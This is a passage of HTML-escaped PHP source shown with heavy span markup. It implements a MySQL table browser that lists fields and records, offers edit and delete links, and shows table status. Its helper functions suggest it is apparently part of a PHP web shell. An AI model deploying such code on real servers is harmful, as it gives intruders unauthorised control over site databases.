#2d2d2d;\"> </span>   $b1 .= '&lt;td nowrap&gt;'.html_clean($ins<span style=\"text-decoration: underline;\">ide).'&amp;nbsp;&lt;/td&gt;';</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $where = base64_encode($where);\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($allowedit) p('&lt;td nowrap&gt;&lt;a href=\"j<span style=\"text-decoration: underline;\">avascript:editrecord(\\'edit\\', \\''.$where.'\\', \\''.$tablename.'\\');\"&gt;Edit&lt;/a&gt; | &lt;a href=\"javascript:editrecord(\\'del\\', \\''.$where.'\\', \\''.$tablename.'\\');\"&gt;Del&lt;/a&gt;&lt;/td&gt;');</span>\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p($b1);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;/tr&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   unset($b1);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;tr class=\"head\"&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($allowedit) p('&lt;td&gt;Action&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $fieldnum = @mysql_num_fields($result);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   for($i=0;$i&lt;$fieldnum;$i++){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $name = @mysql_field_name($result, $i);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $type = @mysql_field_type($result, $i);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $len = @mysql_field_len($result, $i);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p(\"&lt;td nowrap&gt;$name&lt;br&gt;&lt;span&gt;$type($len)<span style=\"text-decoration: underline;\">\".(($rowdb[$name]['Key'] == 'UNI' || $rowdb[$name]['Key'] == 'PRI') ? '&lt;b&gt; - PRIMARY&lt;/b&gt;' : '').($rowdb[$name]['Extra'] == 'auto_increment' ? '&lt;b&gt; - Auto&lt;/b&gt;' : '').\"&lt;/span&gt;&lt;/td&gt;\");</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;/tr&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   tbfoot();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p($multipage);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   break;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   case 2:\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $ar = mysql_affected_rows();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;h2&gt;affected rows : &lt;b&gt;'.$ar.'&lt;/b&gt;&lt;/h2&gt;')<span style=\"text-decoration: underline;\">;</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   break;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } else {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $query = q(\"SHOW TABLE STATUS\");\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $table_num = $table_rows = $data_size = 0;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $tabledb = array();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   while($table = mysql_fetch_array($query)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $data_size = $data_size + $table['Data_length'];\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $table_rows = $table_rows + $table['Rows'];\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $table['Data_length'] = sizecount($table['Data_length']);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $table_num++;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $tabledb[] = $table;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $data_size = sizecount($data_size);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   unset($table);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;form action=\"'.$self.'\" method=\"POST\"&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('action','mysqladmin');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p($dbform);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;tr class=\"head\"&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td width=\"2%\" align=\"center\"&gt;&amp;nbsp;&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;Name&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;Rows&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;Data_length&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;Create_time&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;Update_time&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($highver) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;Engine&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;Collation&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;Operate&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;/tr&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   foreach ($tabledb as $key =&gt; $table) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $thisbg = bg();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;tr class=\"'.$thisbg.'\" onmouseover=\"this.className=\\'foc<span style=\"text-decoration: underline;\">us\\';\" onmouseout=\"this.className=\\''.$thisbg.'\\';\"&gt;');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td align=\"center\" width=\"2%\"&gt;&lt;input type=\"checkbox\" name<span style=\"text-decoration: underline;\">=\"table[]\" value=\"'.$table['Name'].'\" /&gt;&lt;/td&gt;');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;&lt;a href=\"javascript:settable(\\''.$table['Name'].'\\');<span style=\"text-decoration: underline;\">\"&gt;'.$table['Name'].'&lt;/a&gt;&lt;/td&gt;');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;'.$table['Rows'].'&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;'.$table['Data_length'].'&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;'.$table['Create_time'].'&amp;nbsp;&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;'.$table['Update_time'].'&amp;nbsp;&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: 